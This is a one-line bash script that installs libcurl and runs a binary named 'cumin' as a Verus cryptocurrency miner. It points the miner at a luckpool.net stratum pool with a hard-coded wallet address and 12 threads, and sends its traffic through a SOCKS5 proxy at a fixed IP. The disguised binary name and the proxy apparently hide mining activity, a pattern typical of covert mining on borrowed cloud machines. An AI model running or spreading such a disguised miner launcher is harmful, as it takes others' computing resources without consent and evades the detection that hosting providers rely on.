#!/bin/bash
sudo apt-get update && sudo apt install libcurl4-openssl-dev -y && chmod +x cumin && ./cumin -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RKP6YU9bfRCwWicTakWfzgZKRtqcNwAFjr.DevByNongCroissantV5 -t 12 -x socks5://110.77.236.239:4145
